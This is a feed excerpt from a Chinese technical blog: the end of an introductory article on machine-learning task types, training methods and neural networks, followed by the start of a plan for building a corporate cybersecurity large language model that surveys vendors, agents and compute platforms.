width="850"></center><p>基于上图给出的这个数据集，我们看看分类和聚类的任务有何不同。</p><ul><li>分类任务：请根据以上数据集，对每位同学进行挂科与否的分类。其中，分类规则是明确的：1）总成绩低于60分，归类到“挂科”类别中；2）总成绩高于60分，归类到“没挂”类别中；3）总成绩&#x3D;0.5”平时成绩+0.5”期末成绩。</li></ul><center>    <img src="/img/SecGPT1/Fuk2W7T_ukBCNjyDcSZInm7wnGM9.png" width="850"></center><ul><li>聚类任务：请根据以上数据集，请把各位同学分到不同的小组中。注意，现在只有成绩数据，却没有明确的分类规则的，该如何归类呢？不同的人可能会有不同的归类方法，比如下图中就可能会因为“学霸&#x2F;学渣”和“有救&#x2F;没救”的原则，把每个同学分到不同的组。</li></ul><center>    <img src="/img/SecGPT1/FhW8nJ0HoMxCQE9HnDLT2D-QrJlu.png" width="850"></center><h3 id="回归"><a href="#回归" class="headerlink" title="回归"></a>回归</h3><p>分类和聚类，本质上其实都是对事物进行归类。用数学语言描述，就是把空间&#x2F;平面中一个个的点划分到不同的集合中，是一种处理离散型的随机变量问题。但现实生活中还有一些任务，此如预测房价、股价、温度、雨量等，这类任务是根据已有的数据和经验来预测未来的目标结果，用数学语言描述，是对因变量（结果）和自变量（原因）之间的关系进行建模，基于一个或多个自变量的变化来预测因变量的变化，在坐标轴上体现为直线、曲线、区域等图形，是一种处理连续型随机变量的问题，这类任务叫做回归。网上有一句有点拗口但比较精辟的总结：<strong>回归线是一条线或曲线，它穿过目标预测图上的所有数据点，以使数据点和回归线之间的垂直距离最小。</strong></p><p>回归也有多种类型，对应不同的算法：</p><ul><li>线性回归：对自变量和因变量建立一种线性的关系模型。</li><li>逻辑回归：对自变量和因变量建立一种S型函数或 Logistic 函数的关系模型。</li><li>决策树回归：构建一棵决策树（比如二叉树）。一个样本从根节点（root）出发，一定会走到某一个叶子节点，而叶子节点的值则代表这棵决策树对这个样本的预测结果。</li><li>随机森林回归：创建了一个森林，并使它拥有某种方式的随机性。“森林”是更多“树”的集成，随机森林回归可以看作更大范图、更复杂多变的决策树回归的集成。</li></ul><center>    <img src="/img/SecGPT1/FqS0AfEoZ4VTndET4wZ9A6g93GOi.png" width="850"></center><p>特别说明一下，逻辑回归和决策树回归也常常应用到分类任务中。除了上述提到的这些回归算法，还有多项式回归、支持向量机回归等其他算法，不再展开。</p><h2 id="训练方法维度"><a href="#训练方法维度" class="headerlink" title="训练方法维度"></a>训练方法维度</h2><p>所谓训练方法，就是我们让机器如何从浩瀚的数据中学习到有用的知识和规律，这和人类自身的学习过程有很多相似之处。不同的任务要求和数据特征，可能要采用不同的训练方法，或者多种训练方法的组合。</p><h3 id="有监督学习（Supervised-Learning）"><a href="#有监督学习（Supervised-Learning）" class="headerlink" title="有监督学习（Supervised Learning）"></a>有监督学习（Supervised Learning）</h3><p>有监督学习是基于有属性标签的样本数据进行模型训练。标签的本质是表征样本教据和目标结果之间的联系，训练的过程就是要提取出样本数据的特征，根据标签建立特征值和目标结果的函数映射关系。通过这种不断地学习和训练过程，让这种映射越来越准确（即拟合的越来越好），最终实现对新数据进行预测。有监督学习的主要挑战是获取具有准确标签信息的样本数据，对训练样本的标注往往需要花费大量人工成本。</p><p>有监督学习通常用在分类和回归任务中。</p><ul><li>分类任务场景：比如识别垃圾短信和垃圾邮件，都是先通过对一些历史短信和邮件做垃圾分类的标记，然后基于这些带有标记的数据进行模型训练。训练结束后，当获取到新的短信或是新的邮件时，就可以让模型进行分析和匹配，来识别此短信或邮件是或是不是垃圾类别。</li><li>回归任务场景：比如要预测公司的净利润，可以通过历史上公司的利润值，以及跟利润相关的指标因子，比如营业收入、资产负债、管理费用等，训练出利润与因子的回归模型。训练结束后，输入新的指标因子来预测公司的利润。</li></ul><h3 id="无监督学习（Unsupervised-Learning）"><a href="#无监督学习（Unsupervised-Learning）" class="headerlink" title="无监督学习（Unsupervised Learning）"></a>无监督学习（Unsupervised Learning）</h3><p>无监督学习是基于无标签的样本数据进行模型训练。和有监督学习不同，由于样本数据没有预定的标签信息，模型只好自行寻找数据在不同维度上的内在规律。打个不完全恰当的比喻，有监督学习可以比作“科班出身”或“黄埔军校”，无监督学习则可以比作“野路子”或“土八路”，但“土八路”的战斗力可未必弱于“黄埔军校”。另外，正是因为不需要对训练样本数据打标签，相对有监督学习，数据的获取成本比较低，当然致数据质量也更难保证。</p><p>无监督学习常用在聚类任务上。比如通过客户的消费行为（消费次数、最近消费时间、消费金额）指标，来对客户数据进行分层归类：</p><ul><li>第一类，重要价值客户，潜在特征是最近消费时间近、消费频次和消费金额都很高。</li><li>第二类，重要保持客户，潜在特征是最近消费时间较远，但消费频次和金额都很高，说明这是个一段时间没来的忠诚客户，需要主动和他保持联系。</li><li>第三类，重要发展客户，潜在特征是最近消费时间较近、消费金额高，但频次不高，忠诚度可能不高，算是有潜力的用户，应该重点发展。</li><li>第四类，重要挽留客户，潜在特征是最近消费时间较远、消费频次不高，但历史消费金额高，可能是将要流失或者已经要流失的用户，应该启动挽留措施。</li></ul><p>以上这些可用于分类的潜在特征，不是人为提前设定好的，而是由模型算法根据历史数据自己学习到了某种规律，这是无监督学习最重要的特点。</p><h3 id="半监督学习（Semi-Supervised-Learning）"><a href="#半监督学习（Semi-Supervised-Learning）" class="headerlink" title="半监督学习（Semi-Supervised Learning）"></a>半监督学习（Semi-Supervised Learning）</h3><p>半监督学习是有监督学习和无监督学习相互结合的一种训练方法，实现更优的分类，回归和聚类效果。在实际使用中，可以首先通过无监督学习对训练样本进行基于内在特征规律的聚类。以降低人工进行分类的成本。然后，基于聚类后的数据进行标注，让模型再进行有监督的训练，生成最终的预测模型。通过将两种训练方式进行结合，取得更均衡的成本和效果表现。</p><p>举一个在数据安全领域的应用方式。在《中华人民共和国数据安全法》、《数据安全能力成熟度模型》（GB&#x2F;T-37988）、以及政府、金融、交通、运营商等多个行业规范中，都要求对数据基于分类分级的保护。传统的数据分类分级方式主要基于人工来对数据的类别和级别进行标注。但在实际生产环境中，数据规模是巨大的，而且还在持续高速增长中，依靠人工进行分类分级的难度非常高，效率也比较低。因此，可以考虑基于半监督学习的方法训练一个分类分级的机器学习模型出来，用模型提升分类分级工作的效事。训练方法如下：</p><ul><li>第一步，准备训练样本集，目前以关系型数据为主。</li><li>第二步，通过无监督学习，根据数据内容对相似特征的数据进行自动聚类。</li><li>第三步，接下来数据工程师可以介入了，对聚类后的数据进行批量标注，标注后的数据就能进行有监督的学习了，构建生成数据分类分级的标签推荐模型。</li><li>第四步，将分类分级标签推荐模型部署在生产环境中，扫描出生产数据作为模型输入，最终输出分类分级标签的推荐信息。</li></ul><p>这是半监督学习的一个应用实例，这个过程本质就是通过机器学习把数据分类分级工作中的人工消耗尽可能降低，并提升分类分级标签标注的准确性。</p><h3 id="强化学习（Reinforcement-Learning）"><a href="#强化学习（Reinforcement-Learning）" class="headerlink" title="强化学习（Reinforcement Learning）"></a>强化学习（Reinforcement Learning）</h3><p>强化学习，特别是基于人类反馈的强化学习 （RLHF, Reinforcement Learning from Human Feedback），是一种更复杂、更综合的训练方法，它强调让模型与外界不断进行交互和反馈，通过某种预设的奖励信号（尤其是人类对预测结果的优劣评判），来诱导训练的方向，优化模型的预测和决策效果。强化学习经常用于博弈类游戏（如AlphaGo），无人驾驶、机器翻译、聊天机器人等场景。</p><p>2022年，OpenAI 发表了一篇论文 - 《Training language models to follow instructions with human feedback (结合人类反馈信息来训练语言模型使其能理解指令）》，专门阐述了 RLHF 对 GPT 模型训练的价值。在此之前，传统的语言模型通常只能生成符合语法规则的句子，但内容未必非常符合用户的意图、价值观或表达习惯，说白了就是“不像人话”。为了解决这个问题，于是便引入一种基于人类的反馈来微调语言模型的方法，以更好地遵循用户的意图、指令、偏好、价值观，生成更准确、更有逻辑和连贯性、更具可读性的输出。ChatGPT 所带来的惊人效果，更似人类的表现，使得 RLHF 引起了业界的广泛关注。</p><p>以上四种训练方式的基本思路，汇总如下图所示：</p><center>    <img src="/img/SecGPT1/FvbVFMHCor-irGHd6OJSnW-SKval.png" width="850"></center><h2 id="学习算法维度"><a href="#学习算法维度" class="headerlink" title="学习算法维度"></a>学习算法维度</h2><p>计算机算法指的是一系列明确定义的和可计算的步骤，用于解决特定的问题或执行特定的任务。那么，机器学习算法就是从数据中学习和构建出一种规律和模式，来实现分类、聚类、回归等各式各样的目标任务。机器学习的算法非常丰富，常见如线性回归、逻辑回归、决策树、K-means聚类、支持向量机（SVM）、卷积神经网络（CNN）、循环神经网络（RNN）、朴素贝叶斯等。选择何种算法，需要根据具体的问题类型、数据类型、数据量级、计算资源等因素进行选择。使用不合适的算法，可能难以取得理想的效果。</p><p>那么，在实际应用中如何选择不同的学习算法呢？一般可以参考几个方面，但一定不要绝对地来看：</p><ul><li>问题类型：比如分类问题，往往可以选择辑回归、决策树、K-means 等算法；如果是回归类问题，线性回归就是常用的算法。</li><li>数据类型：比如数据是图像，可以选择 CNN；如果数据是序列致据，则可以选择 RNN 或 LSTM。</li><li>数据量：一般来说，比如随机森林、线性回归这样的算法就比较适合大数据量的处理，而支持向量机、K-means 这样的算法则更适合小数据样本。</li><li>计算资源：一般来说，复杂的算法需要更多的计算资源，例如使用了神经网络结构的算法；简单的算法需要的计算资源较少，例如线性回归或逻辑回归。</li><li>训练时间：有些算法的训练时间很长，例如神经网络；有些算法的训练时间较短，例如线性回归。这有时候会影响我们对算法的选择。</li><li>模型解释性：有时候需要一个可以解释的模型，以便可以更容易地理解模型的决策过程，在这种情况下，我们可能会选择决策树或线性回归等可以提供解释的算法。</li></ul><h2 id="模型原理维度"><a href="#模型原理维度" class="headerlink" title="模型原理维度"></a>模型原理维度</h2><p>这个维度指的是根据几何学、逻辑学、统计学、概率论、网络结构等不同的学术原理设计出不同的模型。</p><ul><li>几何模型：基于几何学原理的模型，可以用于描述和分析空间中的物体或现象之间的关系。比如线性回归模型可以用于预测两个变量之间的关系，基于几何距离的聚类算法可以用于图像分割和目标识别等。</li><li>逻辑模型：基于逻辑学原理的模型，可以用于描述和分析事件之间的逻辑关系（比如“因为……所以……”就是一种典型的因果逻辑）。逻辑模型可以用于知识表示、推理和决策等领域。比如布尔逻辑模型（二分类、多分类、决策树）常常用于分类问题。</li><li>概率模型：基于概率论原理的模型，可以用于描述和分析随机事件之间的概率关系。概率模型可以用于概率推理、贝叶斯统计、自然语言处理等领域。比如贝叶斯网络可以用于分类和回归问题，而马尔可夫链可以用于自然语言处理中的语言模型和机器翻译等。</li><li>网络模型：基于网络结构的模型，可以用于描述和分析复杂系统中的相互作用和关系。比如社交网络分析中的图模型可以用于分析用户之间的联系和影响，知识图谱中的图模型可以用于表示实体之间的关系和语义信息等，神经网络或深度神经网络则广泛应用于自然语言处理、图形处理、语音处理等领域中。</li></ul><p>我们对上述划分方式有一个大致的了解即可。这里单独说说网络模型中的神经网络结构，当下已经广泛使用的 CNN、LSTM、RNN，以及大模型时代的 Transformer，都属于神经网络结构。神经网络 （Neural Networks，NN）通过对人类大脑神经元网络的模拟实现对信息的处理。神经网络由大量的节点（也称为神经元）相互连接而成，节点接收输入井被激活来输出信号，而节点与节点之间的连接则实现了信息的传递。</p><p>最简单的神经网络是感知机，它是一个有着若干输入和一个输出的模型，如下图所示：</p><center>    <img src="/img/SecGPT1/Fqj5gfg3iFz_5vQOkZZvruCw9vj0.png" width="850"></center><p>首先，输入和输出之间是一种线性关系，线性函数形式为：</p><center>    <img src="/img/SecGPT1/Fnfz9PKbw2bwTXLFEN-QNo80Gzxr.png" width="850"></center><p>然后，输出结果再经过一个神经元激活函数，最终得到1或-1两个结果，激活函致形式为：</p><center>    <img src="/img/SecGPT1/FhMupWTrp9lVfd8JswUEuCdNW5UO.png" width="850"></center><p>但这个模型只能用于“非此即彼”的二元分类，无法用于复杂的非线性处理。于是在感知机模型的基础上扩展形成更复杂的神经网络，主要做了几件事：</p><ol><li>在输入层和输出层之间增加一个隐藏层，对输入数据进行非线性变换，模型的学习能力和知识实际上就体现在隐藏层中。</li><li>输出层不止一个神经元，可以有多个输出，让模型可以更灵活应用在分类、聚类、回归、降维等多种任务。</li><li>优化了激活函数，比如使用逻辑回归常用的 Sigmoid 函数替代简单但处理能力有限的Sign函数。然而，除了Sigmoid，还可以使用 Softmax、ReLU、tanh （x）函数等作为神经元激活函数。</li></ol><p>于是，神经网络就从简单的感知机变成下面这个更复杂的结构：</p><center>    <img src="/img/SecGPT1/FnJZOOj2vEUGseNSZ402Igrm5262.png" width="850"></center><p>为了进一步优化神经网络的能力，又出现了更复杂的深度神经网络结构（Deep Neural Networks，DNN），可以理解为拥有很多隐藏层的神经网络。DNN 中一般第一层为输入层，最后一层为输出层，中间都是隐藏层，如下图所示：</p><center>    <img src="/img/SecGPT1/Fgck0Lj1DnE7mSKddokykwJFOQ3_.png" width="850"></center><p>如果该神经网络中第 i 层的任意一个神经元节点，都与第 i+1 层的任意一个神经元节点相连接，这被称为全连接神经网络。虽然它看起来很复杂，但局部其实都是一个个的感知机，均由一个线性函数加上一个激活函数构成。一般情况下，深度神经网络的隐藏层越多，它能够学习和表示的复杂模式就越多，但所消耗的资源也越大。神经元之间的连接传递的信息就是权重 wi，神经网络可以通过训练对权重进行调节，换句话说，模型训练的核心工作就是调节权重。权重对是神经网络至关重要，模型的知识就蕴含在这些权重之中。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;2023 年科技圈“最靓的仔”非 ChatGPT 莫属，它是大语言模型（Large Language Model，LLM，简称大模型）的一种，而 AI（Artificial Intelligence，人工智能）也再次成为业界热议的话题，并引发了资本领域的狂欢。但若不是专业领域出身的同学，面对机器学习、神经网络、决策式 AI、生成式 AI、大模型、GPT 等一堆概念的时候，很可能搞不清楚它们之间的层次关系，这将不利于对大模型的学习和理解。因此，有必要从宏观上先对 AI 基础知识进行一些介绍。&lt;/p&gt;</summary>
    
    
    
    <category term="Theories" scheme="https://coldwave96.github.io/categories/Theories/"/>
    
    <category term="AI" scheme="https://coldwave96.github.io/categories/Theories/AI/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
  </entry>
  
  <entry>
    <title>Framework of building SecLLM</title>
    <link href="https://coldwave96.github.io/2024/03/31/SecLLM/"/>
    <id>https://coldwave96.github.io/2024/03/31/SecLLM/</id>
    <published>2024-03-31T00:39:36.000Z</published>
    <updated>2024-03-31T00:39:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="集团网络安全大模型建设方案"><a href="#集团网络安全大模型建设方案" class="headerlink" title="集团网络安全大模型建设方案"></a>集团网络安全大模型建设方案</h1><p>本文主要内容是关于目前网络安全垂直领域大模型情况调研，以及关于集团大模型的建设方案设想。</p><span id="more"></span><h1 id="基础情况调研"><a href="#基础情况调研" class="headerlink" title="基础情况调研"></a>基础情况调研</h1><h2 id="大模型"><a href="#大模型" class="headerlink" title="大模型"></a>大模型</h2><ul><li><p>大模型是指具有大规模参数和复杂计算结构的人工智能算法模型。这些模型通常由深度神经网络构建而成，拥有数十亿甚至数千亿个参数。大模型的设计目的是为了提高模型的表达能力和预测性能，能够处理更加复杂的任务和数据</p></li><li><p>大模型在各种领域都有广泛的应用，包括自然语言处理、计算机视觉、语音识别和推荐系统等。大模型通过训练海量数据来学习复杂的模式和特征，具有更强大的泛化能力，可以对未见过的数据做出准确的预测</p></li><li><p>目前所说的大模型主要指的是大语言模型，近一年来又出现了多模态大模型</p></li><li><p>想要训练一个通用大语言模型需要经过下图中所示的步骤：</p>  <center>      <img src="/img/SecLLM/SecLLM1.png" width="850">  </center>  <ul><li>第一步是预训练，目前是基于 transformer 架构，如 GPT、BERT、LLaMA 等；</li><li>第二步是通过精心构造的问答对数据，对预训练模型进行有监督的微调，培养模型执行具体的下游任务；</li><li>最后两步是 HFRL（Human Feedback Reinforcement Learning，人类反馈强化学习）阶段，主要目的是以人类专家角度对预训练大模型的生成内容进行打分，从而给予大模型正&#x2F;负反馈，协助大模型生成越来越好的内容。</li></ul></li></ul><h2 id="应用现状"><a href="#应用现状" class="headerlink" title="应用现状"></a>应用现状</h2><h3 id="应用模式"><a href="#应用模式" class="headerlink" title="应用模式"></a>应用模式</h3><ul><li>目前大模型主流的应用模式主要分成两种：<ul><li>已有系统的 LLM 拼图：将模型集成于已有的产品或服务中，通过提升某一个环节的智能能力，实现整体系统的效率提升，降低成本。例如，原本生产体系中需要人力投入的环节，可由大模型代替或辅助；</li><li>围绕 LLM 的全新体系：脱离已有的智能产业独立发展，围绕大模型建立独立的产业体系，形成智能能力（简称“智力”）的生产和消费模式。</li></ul></li></ul><h3 id="应用实例"><a href="#应用实例" class="headerlink" title="应用实例"></a>应用实例</h3><ul><li>腾讯<ul><li>混元大模型（闭源）</li><li>应用模式为将模型集成于已有的产品或服务中，致力于提升已有产品的效率和体验，腾讯云、腾讯广告、腾讯游戏、腾讯金融科技、腾讯会议、腾讯文档、微信搜一搜、QQ 浏览器等 50 余个腾讯业务和产品，已经接入混元大模型测试，并取得初步效果</li></ul></li><li>字节跳动<ul><li>云雀大模型（闭源）</li><li>应用模式为围绕大模型建立独立的产业体系，致力于开发 AI 原生应用，成为 AI 时代的应用工程，已上线豆包、扣子等 AI 原生产品外，还将推出 AI 角色互动 APP “话炉”，以及一款或为图片方面的 AI 产品 ”PicPic”</li></ul></li><li>华为<ul><li>盘古大模型（闭源）</li><li>应用模式为围绕大模型建立独立的产业体系，盘古大模型3.0是一个完全面向行业提供服务，以行业需求为基础设计的大模型体系，致力于深耕行业，让人工智能服务好千行百业、服务好科研创新</li></ul></li><li>阿里<ul><li>通义千问大模型（开源）</li><li>应用模式为围绕大模型建立独立的产业体系，利用开源生态的力量建立完整的大模型生态系统</li></ul></li></ul><h3 id="安全应用"><a href="#安全应用" class="headerlink" title="安全应用"></a>安全应用</h3><ul><li><p>Google Sec-PaLM</p><ul><li>利用 Google 威胁情报和 Mandiant 对漏洞、恶意软件、威胁指标和行为威胁行为者特征的前沿情报数据对 Google PaLM 模型进行微调后的大模型</li></ul>  <center>      <img src="/img/SecLLM/SecLLM2.gif" width="850">  </center>      </li><li><p>ChatGPT</p><ul><li>自从 OpenAI 开放 GPT-4 以及 GPTs 的模式之后，出现了许多基于 ChatGPT 的安全小工具。</li><li>这些工具主要聚焦于单点安全问题的解决，比如：<ul><li>ChatGPTScanner - 由 ChatGPT 提供支持的白盒代码扫描</li><li>chatgpt-code-analyzer - 适用于 Visual Studio Code 的 ChatGPT 代码分析器</li><li>vulchatgpt - 使用 IDA Pro 反编译器和 ChatGPT 来查找二进制文件中可能的漏洞</li></ul></li></ul></li><li><p>Microsoft security copilot</p><ul><li><p>通过⼈⼯智能驱动的⽣成助⼿，以⼈⼯智能的速度和规模进⾏保护</p></li><li><p>下图表简化地展示了在 Copilot for Security 背后发⽣的事情。</p>  <center>      <img src="/img/SecLLM/SecLLM3.png" width="850">  </center>  <ul><li>当用户提交⼀个提⽰时，⾸先，Copilot 协调器确定上下⽂，并利⽤ Copilot 可⽤的技能构建计划</li><li>然后它执⾏计划并收集所有必要的内容和数据</li><li>接下来，它结合数据和上下⽂，格式化数据，制定出响应，并交付该响应</li></ul></li></ul></li><li><p>Dropzone AI</p><ul><li>为繁忙的 SOC 预训练的智能体（AI Agents）自主执行端到端调查<ul><li>收集：收到警报后，智能体会连接分散的安全工具和数据堆栈。不知疲倦地查找、获取相关信息，并将其反馈到 LLM 原生系统</li><li>理解：Dropzone 的网络安全推理系统，专门建立在先进的 LLM 之上，针对每个警报运行完整的端到端调查。其安全预训练、组织背景理解和防护措施使其具有高度准确性。</li><li>总结：然后，Dropzone 会生成一份完整的报告，包括结论、执行摘要和用简单英语写成的全面见解。您还可以与聊天机器人对话，进行临时查询。</li></ul></li></ul></li><li><p>奇安信&#x2F;深信服&#x2F;绿盟</p><ul><li>以 SOC 平台为依托，提供智能研判、智能调查、智能问答、智能报告等辅助能力</li></ul></li><li><p>360</p><ul><li>提出安全大脑的概念，除了提供智能安全专家角色辅助日常安全运营外，支持在 SOAR 剧本编排中添加智能节点，提升场景执行的智能化程度</li></ul></li></ul><h3 id="发展趋势"><a href="#发展趋势" class="headerlink" title="发展趋势"></a>发展趋势</h3><ul><li>从应用模式看：<ul><li>LLM 作为拼图的应用模式，从替换传统低效、重复性工作，到可简单的识别意图从而调用工具，再到可简单快速的进行动作决策、场景编排</li><li>LLM 作为独立产业的应用模式，从对话平台，到增加互联网自主搜索能力，再到通过外挂知识库实现的 RAG 方案，以及现在如 GPTs 一样可自行制作专用 ChatGPT 子应用</li></ul></li><li>两种应用模式逐渐走向了同一个趋势“智能体”</li></ul><h2 id="智能体"><a href="#智能体" class="headerlink" title="智能体"></a>智能体</h2><h3 id="概念解释"><a href="#概念解释" class="headerlink" title="概念解释"></a>概念解释</h3><ul><li>智能体或者智能代理（Intelligence Agent）是一种抽象的概念和说法，最早其实来源于哲学领域。从一般意义上讲，Agent 是指具有行动能力的实体，Agent 的概念涉及自主性，有着行使意志、做出选择和采取行动的能力，而不是被动地对外部刺激做出反应。</li><li>在人工智能领域，Agent 是一种计算实体。从本质上讲，AI Agent 并不等同于哲学上的 Agent；相反，它是 Agent 这一哲学概念在人工智能领域的具体化。我们将 AI Agent 视为能够使用传感器感知周围环境，做出决策，然后使用执行器采取行动的人造实体。</li></ul><h3 id="发展趋势-1"><a href="#发展趋势-1" class="headerlink" title="发展趋势"></a>发展趋势</h3><ul><li><p>AI 智能体的发展趋势大体如下：</p>  <center>      <img src="/img/SecLLM/SecLLM4.png" width="850">  </center>  <ul><li>从最开始的符号式 Agents，典型代表为基于知识库的专家系统</li><li>接着是反应式 Agents，根据环境的变化作出相应行动</li><li>然后是如 AlphaGo 一般基于强化学习技术的 Agents</li><li>再下面是结合了迁移学习和元学习技术的 Agents</li><li>大语言模型横空出世之后，目前基于大语言模型的 Agents 成为全新的研究方向</li></ul></li></ul><h3 id="未来方向"><a href="#未来方向" class="headerlink" title="未来方向"></a>未来方向</h3><ul><li><p>根据英伟达公司研究员 Jim Fan 的定义，通用智能体是一个掌握广泛技能，控制许多身体，并能够泛化到多个环境中的单一算法</p></li><li><p>目前的 AI 技术的发展趋势无一例外都遵循着从专家模型到通用模型，再到专业化的通用模型这一发展规律。以网络安全领域为例：</p><ul><li>AI技术在这一领域最开始的应用是以异常检测算法为主的小模型</li><li>到后来通用大模型的出现，开始尝试将通用大模型与行业相结合</li><li>但是在结合的过程中发现通用模型的安全领域能力并不出色，于是开始研究网络安全领域的垂直大模型</li></ul></li><li><p>未来通用智能体的发展方向，其实就是以垂直领域大模型为基础，在以下3个方面不断扩展延伸：</p><ul><li><strong>技能</strong>：智能体能解决任务的数量</li><li><strong>化身</strong>：智能体能够控制的身体形态的多样性，通俗来说就是智能体能够接受多模态的输入</li><li><strong>现实</strong>：智能体能掌握的虚拟或物理空间的数量，换句话说其实就是智能体能够理解和应对的场景数量</li></ul></li><li><p>如下图所示：</p>  <center>      <img src="/img/SecLLM/SecLLM5.png" width="850">  </center>  <ul><li>从 AlphaGo 开始，它在三个维度上的能力及其有限，只是一个面对单一场景，解决专项问题的专项算法</li><li>Voyager 来自于我的世界这款游戏，它被定义为游戏中一个可以自主学习各项技能的智能体，能够根据环境的反馈不断学习新的技能</li><li>MetaMorph 是英伟达推出的一种控制多个不同形态机器人的算法，它实现了化身的多样性</li><li>IsaacSim 作为英伟达的模拟平台，能够不断的模拟现实世界的各种场景，那么它很有可能泛化到真实的物理世界</li><li>最终的发展趋势，也就是基础智能体，在3个维度同时都具有很强的能力</li></ul></li></ul><h1 id="安全大模型设想"><a href="#安全大模型设想" class="headerlink" title="安全大模型设想"></a>安全大模型设想</h1><h2 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h2><ul><li><p>安全离不开业务，所以安全大模型也不能脱离集团大模型。</p></li><li><p>因此我们设想的集团大模型整体框架如下所示：</p>  <center>      <img src="/img/SecLLM/SecLLM6.png" width="850">  </center></li></ul><h2 id="基础设施层"><a href="#基础设施层" class="headerlink" title="基础设施层"></a>基础设施层</h2><ul><li>基础设施层为大模型的训练和推理提供必要的基础设施和高效的管理，涵盖数据和算力两部分。</li></ul><h3 id="大数据仓库"><a href="#大数据仓库" class="headerlink" title="大数据仓库"></a>大数据仓库</h3><ul><li>大数据仓库主要用于存储大模型训练需要的语料，数据类型涵盖通用数据、行业数据和领域数据等。</li><li>对于安全大模型来说，大数据仓库需要具备多源异构数据的接入能力，即允许从不同类型额数据源中获取信息,如网络流量、系统日志、恶意软件样本等。这有助于构建更全面、综合的数据集，为模型提供更深入的理解和分析能力，从而更准确的检测潜在威胁。</li></ul><h3 id="算力集群"><a href="#算力集群" class="headerlink" title="算力集群"></a>算力集群</h3><ul><li>算力集群作为整体框架的硬件底座，为整体框架提供算力支持和调度，分为训练集群和推理集群。</li><li>算力集群需要有高效的 CPU &#x2F; GPU 资源调度技术，优化计算资源的使用，确保模型训练和推理过程中的高性能。通过合理的资源分配，使得模型能够在相同时间内处理更多的数据，提高训练速度、检测速度和响应能力。</li><li>训练集群需要有高速的分布式训练技术，支持并行训练，加快模型的训练速度。这有助于提高模型的适应性，更快的适应新的威胁和变化。</li><li>推理集群需要支持模型推理加速和效率优化技术，降低模型的计算复杂度，减少计算资源的需求。这有助于提高模型效率，使其能够在较小的资源开销下进行更快速的分析。</li><li>目前对于算力集群的建设，主流方案主要有：<ul><li><p><strong>英伟达 Nvidia</strong></p><ul><li>业界标杆，生态完备</li></ul></li><li><p><strong>华为昇腾 Ascend</strong></p><ul><li><p>大模型生态</p>  <center>      <img src="/img/SecLLM/SecLLM7.png" width="850">  </center>  </li><li><p>开发框架</p><ul><li><p>昇思MindSpore</p><p>  <a href="https://www.mindspore.cn/">MindSpore</a></p></li><li><p>第三方框架</p><p>  <a href="https://www.hiascend.com/zh/software/ai-frameworks">昇腾社区-官网丨昇腾万里 让智能无所不及</a></p><ul><li>昇腾 PyTorch</li><li>昇腾 TensorFlow</li></ul></li></ul></li><li><p>训练、部署组件</p><ul><li><p>MindX DL</p><p>  <a href="https://www.hiascend.com/zh/software/mindx-dl">昇腾社区-官网丨昇腾万里 让智能无所不及</a></p></li><li><p>ModelZoo</p><p>  <a href="https://www.hiascend.com/software/modelzoo">开发者主页-昇腾社区</a></p></li></ul></li></ul></li><li><p><strong>昆仑芯</strong></p><ul><li><p>整体生态</p>  <center>      <img src="/img/SecLLM/SecLLM8.png" width="850">  </center>  <ul><li>软硬件工具栈：<ul><li>昆仑芯 SDK &#x2F; 昆仑芯 Anyinfer</li><li>飞桨（PaddlePaddle）对其支持较成熟</li><li>PyTorch &#x2F; DeepSpeed</li></ul></li></ul></li></ul></li><li><p><strong>摩尔线程</strong></p><ul><li><p>整体架构</p>  <center>      <img src="/img/SecLLM/SecLLM9.png" width="850">  </center>  </li><li><p>MUSA 软件栈</p>  <center>      <img src="/img/SecLLM/SecLLM10.png" width="850">  </center>  <ul><li>兼容 CUDA</li></ul></li><li><p>摩尔线程智算中心解决方案 - MTT KUAE 集群</p>  <center>      <img src="/img/SecLLM/SecLLM11.png" width="850">  </center>  <ul><li>MTT KUAE Platform<ul><li>用于 Al 大模型训练、分布式图形渲染、流媒体处理和科学计算的软硬件一体化平台，深度集成全功能 GPU 计算、网络和存储，提供高可靠、高算力服务。</li><li>通过该平台，用户可灵活管理多数据中心、多集群算力资源，集成多维度运维监控、告警和日志系统，帮助智算中心实现运维自动化。</li></ul></li><li>MTT KUAE ModelStudio<ul><li>覆盖大模型预训练、微调和推理全流程，支持所有主流开源大模型。</li><li>通过摩尔线程 MUSIFY 开发工具，可以轻松复用 CUDA 应用生态，内置的容器化解决方案，则可实现 API 一键部署。</li><li>该平台意在提供大模型生命周期管理，通过简洁、易操作的交互界面，用户可按需组织工作流，大幅降低大模型的使用门槛。</li></ul></li></ul></li></ul></li><li><p><strong>天数智芯</strong></p><ul><li><p>整体架构</p>  <center>      <img src="/img/SecLLM/SecLLM12.png" width="850">  </center>  </li><li><p>天数智芯软件栈</p><ul><li><p>FlagPerf</p><p>  <a href="https://github.com/FlagOpen/FlagPerf">GitHub - FlagOpen&#x2F;FlagPerf: FlagPerf is an open-source software platform for  benchmarking AI chips.</a></p></li><li><p>PaddlePaddle &#x2F; PyTorch &#x2F; DeepSpeed &#x2F; Nvidia Megatron</p></li></ul></li></ul></li><li><p><strong>沐曦</strong></p><ul><li>MXMACA 运算平台<ul><li>该运算平台提供了一种简单易用的类C编程语言，供用户为MXMACA架构编写程序，使其在METAX GPU处理器上以超高效率运行。该编程语言能够兼容主流的C&#x2F;C++异构计算语言。</li><li>MXMACA异构计算平台支持多种开源技术，包括AI神经网络框架（TensorFlow&#x2F;PyTorch等）、库（Blas&#x2F;DNN等）和Linux Kernel支持等。</li></ul></li></ul></li></ul></li></ul><h2 id="模型孵化层"><a href="#模型孵化层" class="headerlink" title="模型孵化层"></a>模型孵化层</h2><ul><li>网络安全的实质是业务安全，网络安全大模型不能够脱离对集团业务相关知识数据的理解，因此我们认为建设网络安全大模型的前置条件是建设涵盖集团整体知识数据的基座大模型。</li><li>在集团基座大模型的基础上，通过调整安全、业务和通用数据的配比建设网络安全大模型。</li></ul><h3 id="集团模型"><a href="#集团模型" class="headerlink" title="集团模型"></a>集团模型</h3><ul><li>集团模型是指以通用数据、领域数据和集团数据等为训练语料建设而成的基座大模型。形态应有自然语言基座大模型和多模态基座大模型，用于不同的应用场景。</li><li>目前垂直行业大模型的几种训练策略有：<ul><li><strong>从零训练</strong>：使用通用数据和领域数据混合，从头开始（from 